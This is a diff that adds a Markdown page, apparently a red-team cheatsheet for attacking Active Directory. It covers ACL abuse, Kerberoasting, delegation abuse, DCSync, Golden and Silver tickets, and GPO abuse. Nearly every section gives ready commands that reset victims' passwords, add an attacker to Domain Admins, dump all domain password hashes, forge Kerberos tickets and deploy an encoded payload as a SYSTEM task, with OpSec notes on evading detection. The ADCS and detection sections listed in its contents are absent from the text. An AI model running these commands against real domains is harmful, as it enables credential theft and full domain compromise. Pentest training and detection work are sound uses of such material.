@@ -1,0 +1,1252 @@
+---
+title: "Active Directory Vulnerability & Misconfiguration Cheatsheet"
+excerpt: "A reference for AD attack paths — covering ACL abuse, Kerberos attacks, delegation abuse, domain dominance, GPO exploitation, and ADCS misconfigurations. Designed for Red Team engagements."
+url: "https://asbawy.github.io/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet"
+---
+
+## Table of Contents
+
+- [1. ACL Abuse](#1-acl-abuse)
+  - [1.1 GenericAll](#11-genericall)
+  - [1.2 GenericWrite](#12-genericwrite)
+  - [1.3 WriteDacl](#13-writedacl)
+  - [1.4 WriteOwner](#14-writeowner)
+  - [1.5 Self (AddSelf)](#15-self-addself)
+  - [1.6 AllExtendedRights](#16-allextendedrights)
+- [2. Kerberos Attacks](#2-kerberos-attacks)
+  - [2.1 AS-REP Roasting](#21-as-rep-roasting)
+  - [2.2 Kerberoasting](#22-kerberoasting)
+- [3. Delegation Abuse](#3-delegation-abuse)
+  - [3.1 Unconstrained Delegation](#31-unconstrained-delegation)
+  - [3.2 Constrained Delegation](#32-constrained-delegation)
+  - [3.3 Resource-Based Constrained Delegation (RBCD)](#33-resource-based-constrained-delegation-rbcd)
+- [4. Domain Dominance](#4-domain-dominance)
+  - [4.1 DCSync](#41-dcsync)
+  - [4.2 Golden Ticket](#42-golden-ticket)
+  - [4.3 Silver Ticket](#43-silver-ticket)
+- [5. GPO Abuse](#5-gpo-abuse)
+- [6. ADCS — ESC1 through ESC8](#6-adcs--esc1-through-esc8)
+- [Quick Reference: Attack Path Decision Matrix](#quick-reference-attack-path-decision-matrix)
+- [Detection & Event IDs](#detection--event-ids)
+
+---
+
+# 1. ACL Abuse
+
+Misconfigured permissions on AD objects (users, groups, computers, OUs) are the most common privesc path. Use **BloodHound** to find them fast.
+
+## 1.1 GenericAll
+
+**Full control** over the target object — reset passwords, change SPNs, modify group membership, set RBCD. The most dangerous ACL misconfiguration.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Find objects where you have GenericAll
+Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll' }
+
+# Domain-wide scan (slow)
+Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll'} | Select-Object ObjectDN, Principal
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:GenericAll]->(n)
+RETURN p
+
+-- GenericAll on high-value targets
+MATCH p=(u:User)-[r:GenericAll]->(g:Group)
+WHERE g.highvalue=true
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows — Password Reset">
+
+```powershell
+Set-DomainUserPassword -Identity "target_user" -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Verbose
+
+# Alternative
+net user target_user P@ssw0rd123! /domain
+```
+
+</Tab>
+<Tab label="Windows — Add to Group">
+
+```powershell
+Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user" -Verbose
+
+# Alternative
+net group "Domain Admins" attacker_user /add /domain
+```
+
+</Tab>
+<Tab label="Windows — RBCD on Computer">
+
+```powershell
+# Create machine account
+New-MachineAccount -MachineAccount "FAKECOMPUTER" -Password $(ConvertTo-SecureString 'P@ss1234!' -AsPlainText -Force) -Domain "domain.local" -DomainController "DC01.domain.local"
+
+# Set RBCD
+$sd = New-ADSecurityDescriptor -Identity "FAKECOMPUTER$" -Rights All -Principal "FAKECOMPUTER$"
+$rawbytes = Get-SDRawBytes -SD $sd
+Set-DomainObject -Identity "TARGET$" -Set @{msDS-AllowedToActOnBehalfOfOtherIdentity=$rawbytes} -Verbose
+
+# Get ticket and impersonate
+Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<NTLM_HASH> /impersonateuser:administrator /msdsspn:http/TARGET.domain.local /domain:domain.local /dc:DC01.domain.local /ptt
+
+Enter-PSSession -ComputerName TARGET.domain.local
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Password reset
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set password target_user 'P@ssw0rd123!'
+
+# Add to group
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add groupMember "Domain Admins" attacker
+
+# RBCD
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add computer FAKECOMPUTER 'P@ss1234!'
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set rbcd TARGET\$ FAKECOMPUTER\$
+getTGT.py domain.local/FAKECOMPUTER\$:P@ss1234! -dc-ip 10.0.0.1
+export KRB5CCNAME=FAKECOMPUTER.ccache
+gets4uTicket.py domain.local/FAKECOMPUTER\$:P@ss1234! -spn http/TARGET.domain.local -impersonate administrator -dc-ip 10.0.0.1
+impacket-psexec domain.local/administrator@TARGET.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Password reset generates Event 4724, group changes generate 4728/4732 — both log your SID.
+</Callout>
+
+---
+
+## 1.2 GenericWrite
+
+**Write to any non-protected attribute** — set SPNs for Kerberoasting, change logon scripts, add group members, or configure RBCD on computers. Cannot modify the DACL itself (unlike GenericAll).
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericWrite' }
+
+# Check your own permissions
+$mySid = (Get-DomainUser -Identity $env:USERNAME).objectsid
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    $_.ActiveDirectoryRights -match 'GenericWrite' -and $_.SecurityIdentifier -match $mySid
+} | Select-Object ObjectDN
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:GenericWrite]->(n)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows — SPN Hijack + Kerberoast">
+
+```powershell
+# Set SPN on target user
+Set-DomainObject -Identity "target_user" -Set @{servicePrincipalName='http/evil.target_user'} -Verbose
+
+# Kerberoast it
+Rubeus.exe kerberoast /spn:http/evil.target_user /domain:domain.local /dc:DC01.domain.local /outfile:kerberoast.hash
+
+# Crack offline
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+
+# Clean up
+Set-DomainObject -Identity "target_user" -Clear servicePrincipalName -Verbose
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Set SPN
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set object target_user servicePrincipalName 'http/evil.target_user'
+
+# Kerberoast
+impacket-GetUserSPNs domain.local/attacker:'Password123!' -request -dc-ip 10.0.0.1 -outputfile hashes.txt
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Clean up
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' clear object target_user servicePrincipalName
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** SPN changes generate Event 5136. Overwriting a real SPN breaks the legitimate service — always clean up.
+</Callout>
+
+---
+
+## 1.3 WriteDacl
+
+**Modify the DACL** of the target object — grant yourself any permission, including GenericAll or DCSync rights. WriteDacl on the domain object = game over.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'WriteDacl' }
+
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'WriteDacl' }
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:WriteDacl]->(n)
+RETURN p
+
+MATCH p=(u)-[r:WriteDacl]->(d:Domain)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Grant yourself DCSync rights on the domain
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity "$env:USERNAME" -Rights All -Verbose
+
+# Or using dsacls
+dsacls "DC=domain,DC=local" /G "DOMAIN\attacker:GA;;"
+
+# Now DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all /csv"'
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Grant DCSync rights
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add acl "DC=domain,DC=local" attacker --rights DCSync --grant
+
+# DCSync
+secretsdump.py domain.local/attacker:'Password123!'@10.0.0.1 -just-dc-user administrator
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Modifying the domain DACL is extremely noisy — generates Event 5136 on the domain root. MDI detects this instantly.
+</Callout>
+
+---
+
+## 1.4 WriteOwner
+
+**Change the owner** of an object. The owner implicitly has WriteDacl, so: WriteOwner → take ownership → WriteDacl → grant GenericAll → full compromise.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'WriteOwner' }
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:WriteOwner]->(n)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Take ownership
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "$env:USERNAME" -Verbose
+
+# Grant yourself GenericAll (you're the owner now)
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "$env:USERNAME" -Rights GenericAll -Verbose
+
+# Add yourself to the group
+Add-DomainGroupMember -Identity "Domain Admins" -Members "$env:USERNAME" -Verbose
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set owner "Domain Admins" attacker
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add acl "Domain Admins" attacker --rights GenericAll --grant
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add groupMember "Domain Admins" attacker
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Owner change generates Event 5136. The original owner loses implicit rights — may trigger identity governance alerts.
+</Callout>
+
+---
+
+## 1.5 Self (AddSelf)
+
+**Add yourself to a group** directly — single-step escalation. If this is on a privileged group (Domain Admins, Server Operators), it's instant privilege escalation.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    $_.ActiveDirectoryRights -match 'Self' -and
+    $_.ObjectType -match 'bf9679c0-0de6-11d0-a285-00aa003049e2'
+} | Select-Object ObjectDN, Principal
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:AddMember]->(g:Group)
+RETURN p
+
+MATCH p=(u)-[r:AddMember]->(g:Group)
+WHERE g.highvalue=true
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Add-DomainGroupMember -Identity "Target Group" -Members "$env:USERNAME" -Verbose
+Get-DomainGroupMember -Identity "Target Group"
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' add groupMember "Target Group" attacker
+netexec ldap 10.0.0.1 -u attacker -p 'Password123!' --group "Target Group"
+```
+
+</Tab>
+</Tabs>
+
+---
+
+## 1.6 AllExtendedRights
+
+**All extended rights** on the target — includes **ForceChangePassword** (reset password without knowing the current one). On user objects, this = instant account takeover.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    $_.ActiveDirectoryRights -match 'ExtendedRight' -and
+    $_.SecurityIdentifier -match $(ConvertTo-SID -ObjectName "$env:USERNAME")
+} | Select-Object ObjectDN, ObjectType
+
+# ForceChangePassword specifically (GUID: 00299570-246d-11d0-a768-00aa006e0529)
+Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? { $_.ObjectType -match '00299570-246d-11d0-a768-00aa006e0529' }
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:ForceChangePassword]->(n:User)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Set-DomainUserPassword -Identity "target_user" -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Verbose
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set password target_user 'NewP@ssw0rd!'
+```
+
+</Tab>
+</Tabs>
+
+---
+
+# 2. Kerberos Attacks
+
+These require **no special privileges** — any domain user can perform them. Crack the tickets offline at your leisure.
+
+## 2.1 AS-REP Roasting
+
+Targets accounts with **"Do not require Kerberos preauthentication"** enabled. The DC sends back an encrypted TGT without verifying the password first — crack it offline.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, description, serviceprincipalname
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH (u:User {dontrequirepreauth: true})
+RETURN u.name, u.description
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# All vulnerable users
+Rubeus.exe asreproast /domain:domain.local /dc:DC01.domain.local /outfile:asrep.hash /format:hashcat
+
+# Specific user
+Rubeus.exe asreproast /user:svc_target /domain:domain.local /dc:DC01.domain.local /outfile:asrep.hash /format:hashcat
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# All users with preauth disabled
+GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -request -format hashcat -outputfile asrep_hashes.txt
+
+# From a user list
+GetNPUsers.py domain.local/ -usersfile usernames.txt -dc-ip 10.0.0.1 -request -outputfile asrep_hashes.txt -format hashcat
+
+# Crack
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Generates Event 4768 on the DC. Unauthenticated request — hard to attribute without packet capture.
+</Callout>
+
+---
+
+## 2.2 Kerberoasting
+
+Any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's NTLM hash — crack it offline. Target accounts with **SPNs registered**.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, description, pwdlastset
+
+# High-value: SPN accounts with admin privileges
+Get-DomainUser -SPN | ? { $_.admincount -eq 1 }
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH (u:User)
+WHERE u.hasspn=true
+RETURN u.name, u.serviceprincipalnames, u.description
+
+-- Kerberoastable admins
+MATCH (u:User)
+WHERE u.hasspn=true AND u.admincount=true
+RETURN u.name
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# All SPN accounts
+Rubeus.exe kerberoast /domain:domain.local /dc:DC01.domain.local /outfile:kerberoast.hash /format:hashcat
+
+# Specific SPN
+Rubeus.exe kerberoast /spn:MSSQLSvc/DB01.domain.local:1433 /outfile:kerberoast.hash
+
+# Crack
+hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+impacket-GetUserSPNs domain.local/attacker:'Password123!' -request -dc-ip 10.0.0.1 -outputfile kerberoast_hashes.txt
+
+# Crack
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Generates Event 4769 per SPN. Rapid sequential requests are a detection signature — target only high-value SPNs.
+</Callout>
+
+---
+
+# 3. Delegation Abuse
+
+Kerberos delegation lets a service impersonate users to other services. Misconfigured delegation = impersonate anyone to anything.
+
+## 3.1 Unconstrained Delegation
+
+A server with unconstrained delegation **stores the TGT of every user** that authenticates to it. Compromise the server → extract TGTs → impersonate anyone.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainComputer -Unconstrained | Select-Object dnshostname, operatingsystem
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH (c:Computer {unconstraineddelegation: true})
+RETURN c.name, c.operatingsystem
+
+-- High-value users with sessions on unconstrained delegation machines
+MATCH p=(u:User)-[r:HasSession]->(c:Computer {unconstraineddelegation: true})
+WHERE u.highvalue=true
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Monitor for incoming TGTs on the compromised server
+Rubeus.exe monitor /interval:5 /filteruser:administrator /nowrap
+
+# Force authentication from a DA (PetitPotam / PrinterBug)
+Invoke-PetitPotam -Target WEB01.domain.local -Listener 10.0.0.100
+
+# Extract TGTs from memory
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+# Inject and use
+Rubeus.exe ptt /ticket:administrator.kirbi
+Enter-PSSession -ComputerName DC01.domain.local
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Find unconstrained delegation computers
+netexec ldap 10.0.0.1 -u attacker -p 'Password123!' --unconstrained
+
+# Force auth from DA
+python3 PetitPotam.py -d domain.local -u attacker -p 'Password123!' 10.0.0.100 WEB01.domain.local
+
+# Use captured TGT
+export KRB5CCNAME=/path/to/administrator.ccache
+impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Forced authentication (PetitPotam/PrinterBug) is the noisiest step — consider passive TGT monitoring instead.
+</Callout>
+
+---
+
+## 3.2 Constrained Delegation
+
+The server can only impersonate users to **specific SPNs**. With **protocol transition** (`TrustedToAuthForDelegation`), you can impersonate any user without them authenticating first.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH (c:Computer {trustedtoauth: true})
+RETURN c.name, c.allowedtodelegateto
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# S4U2Self + S4U2Proxy — impersonate admin to the delegated SPN
+Rubeus.exe s4u /user:APP01$ /rc4:<MACHINE_ACCOUNT_NTLM> /impersonateuser:administrator /msdsspn:cifs/DC01.domain.local /domain:domain.local /dc:DC01.domain.local /ptt
+
+# Access the target
+ls \\DC01.domain.local\C$
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+getTGT.py domain.local/APP01\$:<MACHINE_PASSWORD> -dc-ip 10.0.0.1
+export KRB5CCNAME=APP01.ccache
+
+gets4uTicket.py domain.local/APP01\$:<MACHINE_PASSWORD> -spn cifs/DC01.domain.local -impersonate administrator -dc-ip 10.0.0.1
+impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** S4U2Self/S4U2Proxy generate Event 4769 with the impersonated user's name and target SPN — fully visible to defenders.
+</Callout>
+
+---
+
+## 3.3 Resource-Based Constrained Delegation (RBCD)
+
+The **resource (target)** decides who can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. If you can write to a computer object (GenericAll/GenericWrite), you can configure RBCD and impersonate any user.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Find computers you can write to
+Get-DomainComputer | % {
+    $acl = Get-DomainObjectAcl -Identity $_.samaccountname -ResolveGUIDs
+    $acl | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite' -and $_.Principal -match $env:USERNAME }
+} | Select-Object ObjectDN
+
+# Check existing RBCD config
+Get-DomainComputer -Identity "TARGET" | Select-Object msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..2]->(c:Computer)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Step 1: Create machine account
+New-MachineAccount -MachineAccount "FAKE$" -Password $(ConvertTo-SecureString 'P@ss1234!' -AsPlainText -Force)
+
+# Step 2: Set RBCD on target
+$SD = New-ADSecurityDescriptor -Principal "FAKE$" -Right "All" -Target "TARGET$"
+$SDBytes = Get-SDRawBytes -SD $SD
+Set-DomainObject -Identity "TARGET$" -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$SDBytes} -Verbose
+
+# Step 3: S4U to impersonate admin
+Rubeus.exe s4u /user:FAKE$ /rc4:<NTLM_HASH> /impersonateuser:administrator /msdsspn:cifs/TARGET.domain.local /domain:domain.local /dc:DC01.domain.local /ptt
+
+Enter-PSSession -ComputerName TARGET.domain.local
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Create machine account
+addcomputer.py domain.local/attacker:'Password123!' -computer-name 'FAKE' -computer-pass 'P@ss1234!' -dc-host DC01.domain.local -method SAMR
+
+# Set RBCD
+bloodyAD --host 10.0.0.1 -d domain.local -u attacker -p 'Password123!' set rbcd TARGET\$ FAKE\$
+
+# Get ticket and impersonate
+getTGT.py domain.local/FAKE\$:P@ss1234! -dc-ip 10.0.0.1
+export KRB5CCNAME=FAKE.ccache
+gets4uTicket.py domain.local/FAKE\$:P@ss1234! -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip 10.0.0.1
+impacket-psexec domain.local/administrator@TARGET.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** New machine account (Event 4741) + immediate RBCD attribute change (Event 5136) + S4U requests (Event 4769) — strong detection signature.
+</Callout>
+
+---
+
+# 4. Domain Dominance
+
+Post-DA techniques for **persistence** and **full credential extraction**. Once you're here, the domain is owned.
+
+## 4.1 DCSync
+
+Simulate a Domain Controller and **replicate all password hashes** from AD. Requires `Replicating Directory Changes` + `Replicating Directory Changes All` permissions (default for DA/EA/DC).
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Check who has DCSync rights
+$guid1 = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
+$guid2 = "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
+
+Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | ? {
+    $_.ObjectType -match $guid1 -or $_.ObjectType -match $guid2
+} | Select-Object Principal
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(n)-[r:DCSync]->(d:Domain)
+RETURN p
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Full domain dump
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all /csv"'
+
+# Specific user (e.g., krbtgt for Golden Ticket)
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:KRBTGT"'
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Full dump
+secretsdump.py domain.local/administrator:'Password123!'@DC01.domain.local -just-dc -outputfile domain_dump
+
+# Specific user
+secretsdump.py domain.local/administrator:'Password123!'@DC01.domain.local -just-dc-user krbtgt
+
+# Pass-the-Hash
+secretsdump.py domain.local/administrator@DC01.domain.local -just-dc -hashes :NTLM_HASH
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Generates Event 4662 with DCSync GUID. MDI (Microsoft Defender for Identity) detects DCSync from non-DC sources as high-severity.
+</Callout>
+
+---
+
+## 4.2 Golden Ticket
+
+Forge a **TGT** using the `krbtgt` NTLM hash. Grants **unrestricted access to everything** in the domain. Survives all password resets except krbtgt rotation (must be reset **twice**).
+
+**Prerequisites:** krbtgt NTLM hash + domain SID
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Get domain SID
+Get-DomainSID -Domain domain.local
+
+# Get krbtgt hash (via DCSync)
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:KRBTGT"'
+
+# Forge and inject Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt"'
+
+# AES256 key is stealthier (RC4 is more closely monitored)
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /aes256:<KRBTGT_AES256_KEY> /ptt"'
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Forge ticket
+ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXXX -domain domain.local -user Administrator
+
+# Use it
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec domain.local/administrator@DC01.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Nearly impossible to detect — the TGT is cryptographically valid. Defenders look for: abnormal ticket lifetimes, PAC inconsistencies, and Credential Guard.
+</Callout>
+
+---
+
+## 4.3 Silver Ticket
+
+Forge a **Service Ticket (TGS)** using a **machine account NTLM hash**. Grants access to specific services on that machine only. Even harder to detect than Golden Tickets because TGS isn't validated by the KDC.
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Get machine account hash
+secretsdump.py domain.local/attacker:'Password123!'@10.0.0.1 -just-dc-user 'TARGET$'
+
+# CIFS access (file shares)
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:TARGET.domain.local /service:cifs /rc4:<MACHINE_NTLM_HASH> /ptt"'
+
+# LDAP access to DC (DCSync-like)
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:DC01.domain.local /service:ldap /rc4:<DC_MACHINE_HASH> /ptt"'
+
+ls \\TARGET.domain.local\C$
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+ticketer.py -nthash <MACHINE_NTLM_HASH> -domain domain.local -domain-sid S-1-5-21-XXXXXXXXXX -spn cifs/TARGET.domain.local -user Administrator
+
+export KRB5CCNAME=Administrator.ccache
+impacket-smbexec domain.local/administrator@TARGET.domain.local -k -no-pass
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** Nearly undetectable — TGS is validated only by the target service, not the KDC. Enable `ValidateKdcPacSignature` registry key on critical servers to defend.
+</Callout>
+
+---
+
+# 5. GPO Abuse
+
+If you can **write to a GPO** (GenericAll/GenericWrite on the GPO object), you can push malicious config to every machine in the GPO's scope — local admin, scheduled tasks, logon scripts, software deployment.
+
+### Enumeration
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Find GPOs you can modify
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {
+    $_.SecurityIdentifier -match $(ConvertTo-SID -ObjectName "$env:USERNAME") -and
+    $_.ActiveDirectoryRights -match 'Write|FullControl|GenericAll'
+} | Select-Object ObjectDN
+
+# Check GPO scope (which OUs it applies to)
+Get-DomainOU -GPLink "{GPO-GUID}" | Select-Object name, distinguishedname
+```
+
+</Tab>
+<Tab label="BloodHound">
+
+```cypher
+MATCH p=(u:User {name: 'DOMAIN\\attacker'})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..2]->(g:GPO)
+RETURN p
+
+-- GPOs linked to Domain Controllers OU
+MATCH (g:GPO)-[r:GpLink]->(o:OU)
+WHERE o.name CONTAINS 'Domain Controllers'
+RETURN g.name
+```
+
+</Tab>
+</Tabs>
+
+### Exploitation
+
+<Tabs>
+<Tab label="Windows — SharpGPOAbuse">
+
+```powershell
+# Add local admin via GPO
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "attacker" --GPOName "VULN-GPO"
+
+# Deploy scheduled task (SYSTEM)
+SharpGPOAbuse.exe --AddScheduledTask --TaskName "UpdateTask" --Command "powershell.exe" --Arguments "-enc <BASE64_PAYLOAD>" --GPOName "VULN-GPO"
+
+# Deploy logon script
+SharpGPOAbuse.exe --AddUserScript --ScriptName "payload.ps1" --GPOName "VULN-GPO"
+
+# Force GPO refresh
+Invoke-GPUpdate -ComputerName TARGET -Force
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+# Access SYSVOL and modify GPO files directly
+smbclient //domain.local/sysvol -U 'attacker%Password123!'
+cd domain.local/Policies/{GPO-GUID}/Machine
+
+# Check modifiable GPOs
+netexec ldap 10.0.0.1 -u attacker -p 'Password123!' --gpo-modifiable
+```
+
+</Tab>
+</Tabs>
+
